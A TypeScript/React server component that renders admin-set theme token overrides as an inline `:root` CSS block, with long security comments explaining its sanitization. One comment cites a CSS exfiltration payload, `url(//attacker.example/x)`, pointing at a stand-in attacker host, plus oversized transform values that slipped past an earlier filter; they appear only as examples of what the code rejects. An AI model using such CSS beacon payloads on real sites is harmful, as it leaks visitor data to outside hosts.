// Server component: emits an inline `:root { --wjs-*: … }` block built from the active theme's saved
// token overrides (set by the admin Theme Customizer, persisted in the `active_theme_mods` option and
// read here via getSettings). It is SSR'd AFTER the framework + theme stylesheets, so the overrides win
// at equal specificity with no flash-of-unstyled-content and no hydration mismatch (deterministic from
// server data). Empty/absent overrides render nothing — zero visual change for any theme.
//
import { safeCustomPropValue } from "@/components/blocks/safeStyle";
import { isValidThemeMod } from "@/lib/themeTokenPolicy";

// SECURITY: this emits CSS into the page, so it is strictly sanitized — only keys matching `--wjs-…`
// and values made of safe CSS characters (no `;{}:<>` that could break out of the declaration block)
// are emitted; everything else is dropped. The charset alone is NOT enough: `url(//attacker.example/x)`
// is a protocol-relative URL — it needs no `:` and fits entirely inside the allowed characters, so a
// token value could become an exfiltration beacon the moment a browser resolves it. On top of the
// charset, reject any value containing `//`, matching `url(` (any spacing/case), or containing a
// backslash (CSS escapes could smuggle either form past a character filter).
// Both emitters consume the generated policy through lib/themeTokenPolicy; no literal copy lives here.
//
// THE CHARSET IS NOT THE WHOLE CRITERION, and this was the second emitter of a `--wjs-*` value that
// did not know it. `safeStyle.ts` declares safeCustomPropValue "the ONLY way a --* value may be
// emitted, from any channel", and it is a criterion about the PAIR (name, value): a name the
// stylesheet expands into `transform:` gets a parsed, magnitude-bounded grammar, because the
// declaration a value lands in is chosen by the SHEET, not by whoever typed the value. The filter
// below only ever looked at the value's CHARACTERS, so --wjs-button-hover-transform=scale(20),
// --wjs-card-hover-transform=translateY(-4000px), --wjs-pricing-highlight-scale=200 and
// --wjs-xl=99999px all passed it — and because these land in `:root`, ONE mod applies to every block
// on every page: strictly wider than the per-block channel that was already closed.
//
// Writing a mod is admin-only (PUT /settings, POST /themes/mods/import), so this is not privilege
// escalation; it is the same sink reached with a different criterion, which is how the class reopens.
// The charset pass is KEPT (it refuses `//` and any `url(` outright, which safeCssValue permits on
// image-bearing names) and safeCustomPropValue runs after it: two filters, the narrower one last.
export default function ThemeTokenOverlay({ mods }: { mods?: string | Record<string, unknown> | null }) {
    let obj: Record<string, unknown> | null = null;
    if (typeof mods === "string" && mods.trim()) {
        try { obj = JSON.parse(mods); } catch { obj = null; }
    } else if (mods && typeof mods === "object") {
        obj = mods as Record<string, unknown>;
    }
    if (!obj) return null;

    const decls = Object.entries(obj)
        .filter(([k, v]) => isValidThemeMod(k, v))
        .map(([k, v]) => [k, safeCustomPropValue(k, v as string)] as const)
        .filter((pair): pair is readonly [string, string | number] => pair[1] !== null)
        .map(([k, v]) => `${k}:${v}`)
        .join(";");
    if (!decls) return null;

    return <style id="wjs-theme-mods" dangerouslySetInnerHTML={{ __html: `:root{${decls}}` }} />;
}
